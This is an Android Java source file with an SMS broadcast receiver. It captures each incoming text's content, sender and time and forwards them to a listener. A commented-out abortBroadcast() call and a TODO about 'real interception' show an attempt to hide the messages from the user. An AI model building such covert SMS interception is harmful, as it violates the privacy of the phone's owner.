package com.fs.fs.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

import com.fs.fs.api.ProviderService;
import com.fs.fs.bean.SMSInfo;
import com.fs.fs.utils.DateUtils;

/**
 * Created by wyx on 2016/12/30.
 */


public class SMSReceiver extends BroadcastReceiver {
    // TODO:做不到真正的拦截
    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static ProviderService.SMSListener mSmsListener;

    public static void setListener(ProviderService.SMSListener listener) {
        mSmsListener = listener;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(SMS_RECEIVED_ACTION)) {
            Object[] pdusData = (Object[]) intent.getExtras().get("pdus");
            if (pdusData != null) {
                for (Object pdus : pdusData) {
                    SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus);
                    SMSInfo smsInfo = new SMSInfo();
                    smsInfo.content = (msg.getMessageBody());
                    smsInfo.phoneNumber = msg.getOriginatingAddress();
                    smsInfo.time = DateUtils.millis2String(msg.getTimestampMillis());
                    mSmsListener.onReceive(smsInfo);
//                abortBroadcast();
                }
            }
        }

    }
}
